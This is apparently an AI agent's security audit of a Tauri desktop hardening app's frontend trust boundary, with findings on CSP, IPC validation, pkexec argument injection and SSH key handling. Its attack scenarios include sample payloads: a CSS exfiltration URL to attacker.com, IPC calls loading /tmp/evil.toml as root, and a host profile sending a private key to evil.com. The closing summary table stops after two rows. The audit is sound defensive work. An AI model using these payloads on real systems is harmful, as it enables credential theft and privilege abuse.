# Agent 6 -- Frontend Trust Boundary

**Auditor:** Agent 6 (Frontend Trust Boundary)
**Date:** 2026-02-25
**Scope:** Tauri IPC commands, CSP configuration, capability ACLs, WASM<->Tauri serialisation, frontend state management, privilege escalation via IPC
**Files Reviewed:** 34 files across `src-tauri/`, `crates/hardener-ui/`, `crates/hardener-types/`

---

## 1. Architecture Summary

The frontend trust boundary consists of:

```
WASM (Leptos/WebView, user-privilege)
    |
    | window.__TAURI__.invoke()  (JSON-serialised IPC)
    |
Tauri Backend (Rust, user-privilege)
    |
    | tokio::process::Command("pkexec", "hardener", args...)
    |
CLI Process (root-privilege via polkit)
```

**Trust boundary crossings:**
1. WASM -> Tauri IPC (JSON deserialisation in Tauri backend)
2. Tauri backend -> pkexec (argument construction for root process)
3. Tauri backend -> filesystem (user-privilege reads/writes of config, DB, reports)

**Key security properties:**
- Tauri v2 uses capability-based permissions (JSON ACL files)
- CSP configured in `tauri.conf.json`
- `withGlobalTauri: true` exposes `window.__TAURI__` to all scripts in the webview
- 25 IPC commands registered, 6 trigger pkexec (root)
- `std::sync::Mutex` used for shared state (RemoteState)

---

## 2. CSP Analysis

### SA-115 -- CSP Allows `unsafe-inline` for style-src

- **ID:** SA-115
- **Severity:** Low
- **CWE:** CWE-79 (Cross-site Scripting)
- **Location:** `src-tauri/tauri.conf.json:24`
- **Description:** The CSP includes `style-src 'self' 'unsafe-inline'`. While `unsafe-inline` for styles is less dangerous than for scripts, it enables CSS-based exfiltration attacks and relaxes the security boundary. In Tauri's webview context, an attacker who achieves partial content injection (e.g., via reflected error messages rendered in the DOM) could use inline styles for CSS-based data exfiltration through `background-image: url()` or `@font-face` with custom URLs.
- **Attack Scenario:** If any user-controlled string is rendered unsanitised in the DOM (e.g., error messages from backend, finding descriptions from scan results), an attacker could inject `<div style="background:url(http://attacker.com/exfil?data=...")">` to leak data. The `connect-src` directive limits this, but CSS-based exfiltration can bypass connect-src by using `@import`.
- **Remediation:** Replace `'unsafe-inline'` with a nonce-based or hash-based approach for the few required inline styles. Alternatively, since Leptos generates all styles at build time, move all styles to external CSS files and remove `'unsafe-inline'` entirely.
- **Status:** Open

### SA-116 -- CSP Allows data: URIs for img-src

- **ID:** SA-116
- **Severity:** Informational
- **CWE:** CWE-79 (Cross-site Scripting)
- **Location:** `src-tauri/tauri.conf.json:24`
- **Description:** The CSP includes `img-src 'self' data:`. The `data:` URI scheme for images allows base64-encoded image data inline. While this is commonly needed for SVG icons and dynamic images, it slightly weakens the CSP because data URIs bypass origin checks. In isolation this is benign, but combined with other relaxations it increases the attack surface.
- **Attack Scenario:** Minimal direct risk. A `data:` URI in `img-src` cannot execute scripts in modern browsers. However, it could be used for pixel-tracking or visual phishing if content injection is possible.
- **Remediation:** If no base64 images are needed, remove `data:` from `img-src`. If needed, document why and keep the current configuration.
- **Status:** Open

### SA-117 -- withGlobalTauri Exposes IPC to All Scripts in Webview

- **ID:** SA-117
- **Severity:** Medium
- **CWE:** CWE-749 (Exposed Dangerous Method or Function)
- **Location:** `src-tauri/tauri.conf.json:13`
- **Description:** The configuration `"withGlobalTauri": true` makes the `window.__TAURI__` object available to all JavaScript running in the webview. This means any script that executes in the webview context (including scripts injected via XSS or loaded via a compromised CDN) can invoke any registered Tauri command. The Tauri v2 capability system controls which commands are allowed per window, but `core:default` grants broad access to all custom commands registered via `invoke_handler`.

    The current capability configuration is minimal (`core:default`, `dialog:default`), which is good. However, `core:default` includes `core:event:default`, `core:window:default`, `core:webview:default`, `core:app:default` and other default permission sets. More critically, all 25 custom IPC commands registered via `generate_handler!` are accessible because Tauri v2 does not require explicit ACL entries for custom commands -- they are allowed by default unless denied.

- **Attack Scenario:** If any XSS vulnerability exists (e.g., injected through a crafted finding description from a compromised remote host scan), the injected script can call `window.__TAURI__.core.invoke("run_apply", {plugin_ids: ["kernel"], configPath: "/tmp/evil.toml"})` to trigger a privileged apply operation with a malicious config. The user would see the polkit prompt but may not understand the malicious intent.
- **Remediation:** Set `"withGlobalTauri": false` and use Tauri's module import system instead. This limits IPC access to only the WASM code that explicitly imports the Tauri API. Additionally, define explicit capability ACL entries for each custom command rather than relying on the default-allow behaviour.
- **Status:** Open

---

## 3. Capability Analysis

### SA-118 -- Custom IPC Commands Not Gated by Capability ACLs

- **ID:** SA-118
- **Severity:** Medium
- **CWE:** CWE-862 (Missing Authorization)
- **Location:** `src-tauri/capabilities/default.json`
- **Description:** The capability file grants only `core:default` and `dialog:default`. In Tauri v2, custom commands registered via `invoke_handler` are not covered by the capability ACL system -- they are always accessible from any window that has any capability. This means all 25 custom commands (including the 6 that trigger pkexec) are accessible without any explicit grant.

    The 6 pkexec-triggering commands (`run_apply`, `run_rollback`, `create_checkpoint`, `delete_checkpoint`, `run_apply_dry_run` via hardener binary, any future additions) are especially sensitive because they spawn root-level processes. There is no capability-level distinction between read-only commands (e.g., `get_checkpoints`, `list_plugins`) and write/privileged commands.

- **Remediation:** Define custom Tauri v2 permission identifiers for privileged commands and add them explicitly to the capability file. This enables future multi-window architectures (e.g., a settings window with different permissions) and makes the security model auditable. While Tauri v2's capability system for custom commands is limited, explicit documentation of command privilege levels serves as a defence-in-depth marker.
- **Status:** Open

---

## 4. IPC Input Validation -- Privilege Escalation Path

### SA-119 -- No Validation Barrier Between IPC Deserialisation and pkexec Argument Construction (Deepening SA-026/SA-106)

- **ID:** SA-119
- **Severity:** High
- **CWE:** CWE-20 (Improper Input Validation)
- **Location:** `src-tauri/src/commands.rs:349-386` (run_apply), `src-tauri/src/commands.rs:452-471` (run_rollback), `src-tauri/src/commands.rs:526-541` (create_checkpoint), `src-tauri/src/commands.rs:548-566` (delete_checkpoint)
- **Description:** This finding deepens and consolidates SA-026, SA-027, SA-028, SA-106, SA-108, and SA-110 from prior agents. The core issue is systemic: **there is no input validation layer between Tauri IPC deserialisation and privileged command construction**. Every string parameter received from the WASM frontend flows directly into `run_privileged_command()` arguments without any sanitisation, format validation, or allowlist check.

    Affected commands and their unvalidated inputs:

    | Command | Parameter | Flows To | Privilege |
    |---------|-----------|----------|-----------|
    | `run_apply` | `plugin_ids: Vec<String>` | `pkexec hardener apply --plugin <id>` | root |
    | `run_apply` | `config_path: Option<String>` | `pkexec hardener apply --config <path>` | root |
    | `run_rollback` | `checkpoint_id: String` | `pkexec hardener rollback <id>` | root |
    | `run_rollback` | `config_path: Option<String>` | `pkexec hardener rollback --config <path>` | root |
    | `create_checkpoint` | `name: String` | `pkexec hardener checkpoint create <name>` | root |
    | `delete_checkpoint` | `checkpoint_id: String` | `pkexec hardener checkpoint delete <id>` | root |

    While `tokio::process::Command` uses `execve` (not a shell), preventing shell injection, the following attack vectors remain:
    1. **Argument injection:** A plugin ID like `"--config"` followed by `"/tmp/evil.toml"` could inject additional flags.
    2. **Resource exhaustion:** Extremely long strings (megabytes) could cause memory issues in the spawned process.
    3. **Polkit prompt abuse:** Any call to `run_privileged_command()` triggers a polkit authentication dialog. A compromised frontend could spam these prompts to confuse or fatigue the user into authenticating a malicious operation.

- **Attack Scenario:** A compromised WASM module (or XSS exploiting SA-117's `withGlobalTauri`) calls `run_apply` with `plugin_ids: ["kernel", "--config", "/tmp/evil.toml"]`. The constructed args become: `["apply", "--format", "json", "--plugin", "kernel", "--plugin", "--config", "--plugin", "/tmp/evil.toml"]`. While clap will likely reject the `--plugin --config` sequence, different argument orderings or future CLI changes may not. The systematic lack of validation means every CLI change is a potential security regression.
- **Remediation:**
    1. Validate `plugin_ids` against a static allowlist: `^(kernel|ssh|firewall|pam|service|audit|permissions|mac)$`
    2. Validate `checkpoint_id` matches UUID format: `^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`
    3. Validate `checkpoint name` is 1-255 chars, `^[a-zA-Z0-9 _\-]+$`
    4. Validate `config_path` is within `/etc/linux-hardener/` or `~/.config/linux-hardener/`, no `..` components
    5. Insert `"--"` before positional arguments to prevent flag injection
    6. Add a generic `validate_ipc_string()` helper that rejects control characters (< 0x20) and strings over 4096 bytes
- **Status:** Open

### SA-120 -- config_path Traversal Enables Root-Privilege Arbitrary File Read (Deepening SA-107/SA-031)

- **ID:** SA-120
- **Severity:** High
- **CWE:** CWE-22 (Path Traversal)
- **Location:** `src-tauri/src/commands.rs:369-373` (run_apply), `src-tauri/src/commands.rs:460-464` (run_rollback)
- **Description:** Deepens SA-107 and SA-031. The `config_path` parameter from the frontend is passed to `pkexec hardener apply --config <path>`, causing the root-privilege CLI process to open and read the file at the specified path. The frontend can supply **any absolute path**, and the Tauri backend performs zero path validation before passing it to the privileged process.

    This is distinct from the `validate_config` command (which reads as the current user) because in `run_apply` and `run_rollback`, the file is read **as root** via pkexec. This means:
    - `/etc/shadow` can be read as root (TOML parse errors may leak content fragments)
    - A crafted TOML file at a world-writable location could override security settings
    - Symlinks at the config path could redirect the read to any file

    The `validate_config` command (line 1151) also has path traversal but runs as the current user, limiting impact to user-readable files.

- **Attack Scenario:** Attacker places a malicious config at `/tmp/evil.toml` that disables all plugins and adds exceptions for every check. Then triggers `run_apply` with `configPath: "/tmp/evil.toml"`. The root-privilege CLI reads this config and applies a weakened security policy. The user sees a polkit prompt but has no indication that a non-standard config is being used.
- **Remediation:**
    1. Restrict `config_path` to allowed directories: `~/.config/linux-hardener/` and `/etc/linux-hardener/`
    2. Canonicalise the path (`std::fs::canonicalize`) and verify it stays within the allowed prefix
    3. Reject paths containing `..` segments
    4. For `run_apply`/`run_rollback`, display the config path in the polkit prompt description so the user can verify
- **Status:** Open

---

## 5. IPC Input Validation -- User-Privilege Operations

### SA-121 -- export_compliance_report Allows Arbitrary File Write

- **ID:** SA-121
- **Severity:** Medium
- **CWE:** CWE-73 (External Control of File Name or Path)
- **Location:** `src-tauri/src/commands.rs:641-703`
- **Description:** The `export_compliance_report` command accepts `output_path: Option<String>` from the frontend and writes formatted report content to that path using `std::fs::write()`. The path undergoes no validation -- any writable path on disk is accepted.

    While this runs as the current user (not root), the user running the Tauri app may have write access to sensitive locations:
    - `~/.bashrc` -- overwrite with report content, breaking the user's shell
    - `~/.ssh/authorized_keys` -- overwrite, locking the user out
    - `~/.config/linux-hardener/config.toml` -- overwrite the hardener config itself
    - Cron directories if writable by the user

    The report content is generated by the application (not directly user-controlled), but the format string (`format` parameter) controls which formatter runs, and the HTML/PDF formatters produce content that includes finding descriptions -- which could be attacker-influenced if a remote scan returned crafted findings.

- **Attack Scenario:** A compromised frontend calls `export_compliance_report` with `output_path: "/home/user/.bashrc"` and `format: "text"`. The text report overwrites .bashrc, which on next shell login executes any embedded content. More directly, `output_path: "/home/user/.config/linux-hardener/config.toml"` corrupts the hardener config.
- **Remediation:**
    1. Validate `output_path` is within an allowed directory (e.g., `~/Documents/`, `/tmp/`)
    2. Require the path to have the correct extension for the format
    3. Refuse to overwrite existing files (use `create_new` instead of `write`)
    4. Prefer using Tauri's `dialog` plugin to get a save path from the OS file dialog, which provides user intent verification
- **Status:** Open

### SA-122 -- validate_config Reads Arbitrary Files as Current User

- **ID:** SA-122
- **Severity:** Low
- **CWE:** CWE-22 (Path Traversal)
- **Location:** `src-tauri/src/commands.rs:1151-1216`
- **Description:** The `validate_config` command accepts a `path: String` from the frontend and reads the file at that path using `ConfigLoader`. The `ConfigSummary` response includes whether parsing succeeded and the error message if it failed. TOML parse errors from non-TOML files (e.g., `/etc/passwd`) include fragments of the file content in the error message, enabling information disclosure.

    Since this runs as the current user, the disclosure is limited to files the user can already read. However, in the GUI context, the information is exposed to the WASM code and displayed in the UI, which could be observed by browser-extension-level attackers or leaked through other vulnerabilities.

- **Attack Scenario:** Frontend sends `path: "/etc/passwd"`. ConfigLoader attempts TOML parsing, fails, and returns an error like `"Failed to parse: expected '=' at line 1, column 5: 'root:x:0:0:...'`. The error message includes partial file content.
- **Remediation:** Validate that the path has a `.toml` extension and is within expected config directories. Sanitise TOML parsing error messages to remove file content fragments before returning to the frontend.
- **Status:** Open

### SA-123 -- save_scheduler_config Writes to Config File Without Path Validation

- **ID:** SA-123
- **Severity:** Low
- **CWE:** CWE-73 (External Control of File Name or Path)
- **Location:** `src-tauri/src/commands.rs:1031-1063`
- **Description:** The `save_scheduler_config` command determines the config path via `hardener_config_path()`, which checks `~/.config/linux-hardener/config.toml` then `/etc/linux-hardener/config.toml`. The content written is serialised from the `SchedulerUiConfig` struct received from the frontend.

    While the path itself is not frontend-controlled (mitigating path traversal), the content is entirely frontend-controlled. The `SchedulerUiConfig` struct has string fields (`schedule`, `min_severity`, `plugins`, webhook `url`, email `recipients`, `from_address`) that are written to the TOML config without validation. A malicious frontend could inject TOML syntax to corrupt or add arbitrary sections:
    - `schedule: "0 0 2 * * *\n\n[kernel]\nenabled = false"` could inject a `[kernel]` section into the config
    - `url: "http://attacker.com"` is saved directly, enabling SSRF when the scheduler daemon reads this config

    The `toml_edit` usage (line 1047-1057) provides some protection because it serialises the struct through `toml::to_string()` first, which properly escapes TOML special characters. However, this depends on the `toml` crate correctly escaping all values.

- **Attack Scenario:** A compromised frontend saves `schedule: "*/1 * * * * *"` (every second) to create a CPU-intensive scan loop when the scheduler daemon is enabled.
- **Remediation:**
    1. Validate `schedule` against a cron parser before saving (reject invalid or excessively frequent schedules)
    2. Validate `plugins` against the known plugin ID allowlist
    3. Validate `min_severity` against the enum variants (info/low/medium/high/critical)
    4. Validate `url` against URL syntax with scheme allowlist (https only)
    5. Validate email addresses with a basic regex
- **Status:** Open

---

## 6. Serialisation and Deserialisation Safety

### SA-124 -- Tauri JSON Deserialisation Panics on Malformed Input Are Handled Gracefully

- **ID:** SA-124
- **Severity:** Informational
- **CWE:** N/A
- **Location:** `src-tauri/src/commands.rs` (all `#[tauri::command]` functions)
- **Description:** Tauri v2's `#[tauri::command]` macro automatically handles JSON deserialisation of command parameters. If a frontend sends malformed JSON or wrong types, Tauri returns a deserialisation error rather than panicking. This was verified by reviewing the `serde` derive macros on all parameter types and the Tauri command framework's error handling.

    All response types implement `Serialize` and are converted through `serde_json`. The `serde_json::from_str()` calls in `run_apply` (line 381), `run_rollback` (line 470), and `run_apply_dry_run` (line 441) use `map_err` to convert parse errors to user-facing strings rather than panicking.

    **Positive finding:** No deserialisation-induced panics found. All error paths return `Result::Err`.

- **Remediation:** No action needed. Continue using the current pattern.
- **Status:** Closed (Informational)

### SA-125 -- JSON Output Parsing Trusts CLI stdout Without Bounds Checking

- **ID:** SA-125
- **Severity:** Low
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **Location:** `src-tauri/src/commands.rs:381-383` (run_apply), `src-tauri/src/commands.rs:437-442` (run_apply_dry_run), `src-tauri/src/commands.rs:470` (run_rollback)
- **Description:** After executing the CLI via pkexec, the Tauri backend parses the CLI's stdout as JSON:
    ```rust
    let parsed: Vec<(PluginMetadata, ApplyResult)> = serde_json::from_str(&output)
        .map_err(|e| format!("Failed to parse apply results: {}", e))?;
    ```

    The `output` string is the entire stdout of the CLI process, which could be arbitrarily large. There is no size limit on the output before attempting JSON parsing. Additionally, `run_apply_dry_run` uses `stdout.find('[')` (line 437) to locate the start of JSON, which could be exploited by a crafted binary that outputs a large amount of non-JSON text before the array.

    While the CLI binary is trusted (it is the same hardener binary), if the binary path resolution (SA-030) is exploited to run a different binary, the attacker controls the entire stdout content. The `serde_json` parser will allocate memory proportional to the input size.

- **Attack Scenario:** If the hardener binary path is replaced (SA-030), the substituted binary outputs 1 GB of JSON. The Tauri backend allocates this into a `String`, then `serde_json` allocates additional memory for parsing, causing OOM.
- **Remediation:** Limit the size of stdout captured from the CLI process (e.g., 10 MB). Truncate or reject output exceeding the limit before attempting JSON parsing.
- **Status:** Open

---

## 7. State Management and Concurrency

### SA-126 -- std::sync::Mutex on RemoteState Can Cause Tauri Thread Deadlock

- **ID:** SA-126
- **Severity:** Medium
- **CWE:** CWE-833 (Deadlock)
- **Location:** `src-tauri/src/commands.rs:27` (RemoteState), `src-tauri/src/main.rs:22`
- **Description:** The `RemoteState` struct uses `std::sync::Mutex<Option<ActiveConnection>>` for managing the SSH connection. Tauri v2 commands run on a tokio async runtime. Holding a `std::sync::Mutex` across an `.await` point can cause deadlock because:
    1. The mutex is held while executing an async operation
    2. If the tokio worker thread blocks on the mutex, other tasks on that thread cannot progress
    3. If the task holding the mutex is scheduled on a blocked thread, deadlock occurs

    In `connect_remote` (line 911-917), the mutex is acquired, the connection is stored, and the lock is released before any `.await`. This is safe. In `run_remote_scan` (line 954-963), the mutex is acquired, the Arc is cloned, and the lock is released before scanning. This is also safe.

    However, the use of `std::sync::Mutex` (not `tokio::sync::Mutex`) means that if any future code change holds the lock across an `.await` boundary, it will silently introduce a deadlock. Additionally, if the mutex is poisoned (a prior holder panicked), all subsequent lock attempts fail with `PoisonError`. The `map_err` on line 914 converts this to a user-facing error string, but the connection state becomes permanently unusable until the app restarts.

- **Attack Scenario:** Not directly exploitable by an external attacker. The risk is a latent code quality issue that could become a deadlock if future changes hold the mutex across an async operation. The mutex poisoning scenario could be triggered by a panic in `SshExecutor::connect()`, permanently locking out the remote scanning feature.
- **Remediation:** Replace `std::sync::Mutex` with `tokio::sync::Mutex` to make it safe for async contexts. Add a `clear_poisoned()` recovery mechanism or use `parking_lot::Mutex` which does not have poisoning semantics.
- **Status:** Open

### SA-127 -- No Concurrency Guards on Privileged Operations

- **ID:** SA-127
- **Severity:** Medium
- **CWE:** CWE-362 (Race Condition)
- **Location:** `src-tauri/src/commands.rs:349-386` (run_apply), `src-tauri/src/commands.rs:452-471` (run_rollback)
- **Description:** Nothing prevents multiple concurrent calls to `run_apply` or `run_rollback`. Each call spawns a separate `pkexec hardener` process. If the user (or a compromised frontend) triggers two `run_apply` calls simultaneously:
    1. Both processes create checkpoints at nearly the same time (potentially capturing the same state)
    2. Both processes apply changes concurrently to the same config files
    3. File writes from one process may be overwritten by the other
    4. The final system state is nondeterministic

    The frontend has boolean guards (`is_applying`, `is_scanning`) that disable buttons while operations are in progress, but these are client-side only and trivially bypassed by a compromised frontend that calls IPC directly.

- **Attack Scenario:** A compromised frontend sends `run_apply(["kernel"])` and `run_rollback(checkpoint_id)` simultaneously. The rollback restores files while the apply is writing new values. The resulting system state is a random mix of old and new configurations -- potentially leaving the system in a less secure state than either the checkpoint or the applied policy.
- **Remediation:** Add a server-side (Tauri backend) operation lock using an `AtomicBool` or `Mutex<()>` that serialises privileged operations. Return an error if an operation is already in progress. This prevents concurrent pkexec invocations regardless of frontend behaviour.
- **Status:** Open

---

## 8. Frontend-Specific Security

### SA-128 -- Leptos View Rendering Is XSS-Safe by Default (Positive Finding)

- **ID:** SA-128
- **Severity:** Informational
- **CWE:** N/A
- **Location:** `crates/hardener-ui/src/components/` (all view macros)
- **Description:** All data rendered in Leptos `view!{}` macros uses text nodes (`{variable}`) rather than `inner_html` or raw HTML insertion. The only `set_inner_html` call is in `lib.rs:121` where it clears the loading placeholder with an empty string (`app_element.set_inner_html("")`), which is safe.

    Leptos automatically escapes text content when rendering through `{variable}` interpolation in `view!` macros. This means even if backend data contains HTML tags (e.g., a finding description containing `<script>`), it would be rendered as literal text, not executed as HTML.

    **Specific review of data rendered from backend:**
    - Finding titles, descriptions, explanations, impact, remediation steps: all rendered as text nodes
    - Checkpoint names, IDs, timestamps: all rendered as text nodes
    - Error messages: rendered as text in `<span>` elements
    - Host profiles (name, hostname, user): rendered as text nodes

    No `inner_html` or `dangerously_set_inner_html` patterns found in any component.

- **Remediation:** No action needed. Continue using Leptos text interpolation for all backend data.
- **Status:** Closed (Positive Finding)

### SA-129 -- Theme Value Written to DOM Attribute Without Validation

- **ID:** SA-129
- **Severity:** Low
- **CWE:** CWE-79 (Cross-site Scripting)
- **Location:** `crates/hardener-ui/src/components/theme_toggle.rs:66-75`
- **Description:** The `apply_theme()` function takes a theme string from `localStorage` or user selection and sets it as a `data-theme` attribute on the `<html>` element:
    ```rust
    let _ = root.set_attribute("data-theme", theme);
    ```

    If an attacker can write to localStorage (e.g., via a co-located web page on the same origin, or through a browser extension), they could set a crafted theme value. While `set_attribute` on `data-theme` does not execute scripts, a very long attribute value could cause rendering performance issues, and certain CSS attribute selectors could be triggered unexpectedly.

    The theme values are selected from a hardcoded list in the UI (`THEMES` constant), but `get_stored_theme()` reads from localStorage without validating against this list before passing to `apply_theme()`.

- **Attack Scenario:** An attacker writes `localStorage.setItem("theme", "x".repeat(10000000))` from a browser extension or co-located context. On next app load, a 10MB string is set as a DOM attribute, potentially causing rendering lag.
- **Remediation:** Validate the theme value from localStorage against the `THEMES` allowlist before applying it. Fall back to "default" if the stored value is not in the list.
- **Status:** Open

### SA-130 -- localStorage Theme Preference Is Not Security-Sensitive (Informational)

- **ID:** SA-130
- **Severity:** Informational
- **CWE:** N/A
- **Location:** `crates/hardener-ui/src/components/theme_toggle.rs:78-90`
- **Description:** The only data stored in localStorage is the theme preference (a short string like "default", "fortress", etc.). No secrets, tokens, credentials, or sensitive configuration data are stored in localStorage. This is a positive finding -- the application correctly avoids storing sensitive data in client-side storage.
- **Remediation:** No action needed.
- **Status:** Closed (Positive Finding)

---

## 9. Information Disclosure via IPC

### SA-131 -- Checkpoint Detail Exposes File Paths and Permissions to Frontend

- **ID:** SA-131
- **Severity:** Low
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Location:** `src-tauri/src/commands.rs:780-796` (checkpoint_to_detail)
- **Description:** The `get_checkpoint_detail` command returns a list of all files captured in a checkpoint, including their full filesystem paths and octal permissions:
    ```rust
    CheckpointFileInfo {
        path: f.file_path,        // e.g., "/etc/ssh/sshd_config"
        permissions: format!("{:o}", f.file_permissions),  // e.g., "600"
        has_content: f.file_content.is_some(),
    }
    ```

    This information is sent to the WASM frontend where it is rendered in the DOM and accessible via browser developer tools. The paths and permissions of system configuration files could be useful for reconnaissance. Note that `file_content` is not sent (only `has_content`), which is good.

- **Attack Scenario:** A browser extension or XSS exploit reads the DOM to enumerate which system config files exist and their permissions. This reveals which hardening plugins have been applied and what files were modified.
- **Remediation:** Consider whether the full file path list needs to be sent to the frontend, or if a summary count is sufficient. If the full list is needed, it is already low-sensitivity (paths of well-known config files).
- **Status:** Open

### SA-132 -- Error Messages Propagated to Frontend Contain Internal Paths (Confirming SA-112)

- **ID:** SA-132
- **Severity:** Low
- **CWE:** CWE-209 (Error Message Containing Sensitive Information)
- **Location:** `src-tauri/src/commands.rs` (multiple locations: lines 239-241, 279, 323-325, 429-431, 696-699)
- **Description:** Confirms and deepens SA-112 from Agent 5. Throughout `commands.rs`, errors from internal operations are converted to strings and returned to the frontend. Examples:
    - `init_db` errors reveal the database path: `"Failed to initialise database at /home/user/.local/share/linux-hardener/checkpoints.db: ..."`
    - `ConfigLoader` errors reveal config file paths and parsing details
    - `std::fs::write` errors for report export reveal the full target path
    - `pkexec` stderr output is passed verbatim (line 215), potentially including system details

    These error strings are displayed in the UI error banner (`app_state.error_message`) and logged to the browser console, making them accessible to browser developer tools and extensions.

- **Remediation:** Implement an error mapping layer in `commands.rs` that converts internal errors to user-friendly messages while logging the full error via `tracing::error!`. Example: `map_err(|e| { tracing::error!("DB init failed: {e}"); "Database initialization failed".to_string() })`.
- **Status:** Open

---

## 10. Remote Scanning -- Additional Trust Boundary

### SA-133 -- SSH Key File Path From Frontend Enables Credential Exfiltration (Deepening SA-109)

- **ID:** SA-133
- **Severity:** Medium
- **CWE:** CWE-522 (Insufficiently Protected Credentials)
- **Location:** `src-tauri/src/commands.rs:878-901` (connect_remote), `crates/hardener-types/src/remote.rs:17`
- **Description:** Deepens SA-109 from Agent 5. The `RemoteHostProfile.key_file` field accepts any file path. When `connect_remote` is called, this path is passed to the SSH client library which reads the file and uses it as the authentication key. There are two attack vectors:

    1. **Credential theft via SSRF:** A compromised frontend saves a profile with `key_file: "/etc/ssl/private/server.key"` and `hostname: "attacker.com"`. When the user connects, the SSH client reads the private key and uses it to authenticate to the attacker's server. The key material is transmitted during the SSH handshake.

    2. **Local file probe:** A compromised frontend saves profiles with different `key_file` values (e.g., `/root/.ssh/id_rsa`, `/home/otheruser/.ssh/id_ed25519`). The connection error messages reveal whether the files exist and are readable.

    The `host_key_checking` field defaults to `true`, but the frontend can set it to `false`, disabling host key verification. This enables MITM attacks where an attacker intercepts the SSH connection and captures the authentication credentials.

- **Attack Scenario:** Attacker exploits XSS (via SA-117) to save a host profile with `hostname: "evil.com"`, `key_file: "/home/user/.ssh/id_ed25519"`, `host_key_checking: false`. Next time the user opens the Remote page and clicks Connect on this profile, the SSH client reads the user's private key and sends it to the attacker's SSH server.
- **Remediation:**
    1. Restrict `key_file` paths to `~/.ssh/` directory only
    2. Validate that `key_file` does not contain path traversal (`..`)
    3. Warn or block when `host_key_checking` is set to `false`
    4. Validate `hostname` is a valid DNS name or IP address (no scheme, no path components)
    5. Validate `user` matches `^[a-zA-Z_][a-zA-Z0-9_-]*$`
- **Status:** Open

---

## 11. WASM-Tauri Binding Inconsistencies

### SA-134 -- Parameter Key Mismatch Between WASM Bindings and Tauri Commands

- **ID:** SA-134
- **Severity:** Low
- **CWE:** CWE-233 (Improper Handling of Parameters)
- **Location:** `crates/hardener-ui/src/tauri_bindings.rs:62-66` vs `src-tauri/src/commands.rs:261-263`
- **Description:** Some WASM bindings use camelCase keys while the corresponding Tauri commands expect snake_case, and vice versa. Tauri v2 performs automatic case conversion between JavaScript camelCase and Rust snake_case for command parameters, so this works at runtime. However, the inconsistency creates confusion about what the actual wire format is:

    | WASM Binding | Wire Key | Tauri Param |
    |-------------|----------|-------------|
    | `invoke_scan` | `"pluginIds"` | `plugin_ids` |
    | `invoke_apply` | `"plugin_ids"` | `plugin_ids` |
    | `invoke_rollback` | `"checkpoint_id"` | `checkpoint_id` |
    | `invoke_rollback` | `"configPath"` | `config_path` |
    | `invoke_apply` | `"configPath"` | `config_path` |
    | `invoke_delete_checkpoint` | `"checkpointId"` | `checkpoint_id` |

    The mix of camelCase and snake_case across different bindings is inconsistent. While Tauri handles both, this makes it harder to reason about the IPC protocol and write consistent validation rules.

- **Attack Scenario:** Not directly exploitable. The inconsistency is a code quality issue that complicates security review and could lead to bugs if Tauri's auto-conversion behaviour changes.
- **Remediation:** Standardise all WASM binding keys to snake_case to match the Rust command parameter names exactly. This makes the IPC protocol consistent and auditable.
- **Status:** Open

---

## 12. Privilege Boundary Design Assessment

### SA-135 -- No Rate Limiting on pkexec-Triggering IPC Commands

- **ID:** SA-135
- **Severity:** Medium
- **CWE:** CWE-799 (Improper Control of Interaction Frequency)
- **Location:** `src-tauri/src/commands.rs:349,452,526,548`
- **Description:** There is no rate limiting or cooldown on IPC commands that trigger pkexec. A compromised or malicious frontend can call `run_apply`, `run_rollback`, `create_checkpoint`, or `delete_checkpoint` in rapid succession. Each call spawns a `pkexec` process which:
    1. Displays a polkit authentication prompt (if no recent auth is cached)
    2. Spawns the hardener CLI as root
    3. Reads/writes system configuration files

    Polkit typically caches authentication for a short period (5-15 minutes depending on configuration). During this cached period, subsequent pkexec calls succeed without prompting. This means a single user authentication could be leveraged by a compromised frontend to execute many privileged operations.

- **Attack Scenario:** User authenticates for a legitimate `run_apply` operation. Within the polkit cache window, a compromised frontend rapidly calls `run_apply` multiple times with different configs or `run_rollback` to arbitrary checkpoints, all executing as root without additional prompts.
- **Remediation:**
    1. Add a minimum interval between privileged operations (e.g., 5 seconds)
    2. Implement an operation counter that limits privileged calls per session
    3. Clear the polkit authentication cache after each privileged operation by using `--disable-internal-agent` or similar mechanism
    4. Display a confirmation dialog (Tauri-native, not WASM) before each privileged operation showing exactly what will be executed
- **Status:** Open

### SA-136 -- Dry-Run Executes CLI Without Privilege Escalation But With User-Controlled Arguments

- **ID:** SA-136
- **Severity:** Low
- **CWE:** CWE-20 (Improper Input Validation)
- **Location:** `src-tauri/src/commands.rs:393-445`
- **Description:** The `run_apply_dry_run` command runs the hardener CLI without pkexec (as the current user) but still accepts `plugin_ids` and `config_path` from the frontend without validation. While the risk is lower (no root execution), the CLI binary still reads files and enumerates system state. The `config_path` parameter allows reading any user-accessible file, and the error messages from CLI execution could leak system information.
- **Attack Scenario:** A compromised frontend calls `run_apply_dry_run` with `configPath: "/home/user/.ssh/config"`. The CLI attempts to parse it as a hardener config, and the error message reveals SSH configuration details.
- **Remediation:** Apply the same input validation for dry-run as for privileged operations: validate plugin IDs against allowlist, validate config path against allowed directories.
- **Status:** Open

---

## 13. Prior Finding Validation Summary

| Prior Finding | Agent | Status | This Audit's Assessment |
|---------------|-------|--------|------------------------|
| SA-026 | Agent 2 | Open | **Confirmed and deepened** as SA-119. Systemic issue across all 6 pkexec commands. |
| SA-027 | Agent 2 | Open | **Confirmed and deepened** as SA-119. Checkpoint ID format validation needed. |
| SA-028 | Agent 2 | Open | **Confirmed and deepened** as SA-119. Name validation needed. |
| SA-031 | Agent 2 | Open | **Confirmed and deepened** as SA-120. Root-privilege file read is high severity. |
| SA-106 | Agent 5 | Open | **Confirmed and deepened** as SA-119. Elevated nuance: not shell injection but argument injection + polkit abuse. |
| SA-107 | Agent 5 | Open | **Confirmed and deepened** as SA-120. Distinguished user-privilege (validate_config) from root-privilege (run_apply) paths. |
| SA-108 | Agent 5 | Open | **Confirmed** as part of SA-119. UUID format validation needed. |
| SA-109 | Agent 5 | Open | **Confirmed and deepened** as SA-133. Added credential exfiltration vector. |
| SA-110 | Agent 5 | Open | **Confirmed** as part of SA-119. Name content validation needed. |
| SA-112 | Agent 5 | Open | **Confirmed** as SA-132. Same finding, additional code locations identified. |

---

## 14. Summary

### New Findings

| ID | Severity | CWE | Category | Location |
|----|----------|-----|----------|----------|
| SA-115 | Low | CWE-79 | CSP | `tauri.conf.json:24` |
| SA-116 | Info | CWE-79 | CSP | `tauri.conf.json:24` |
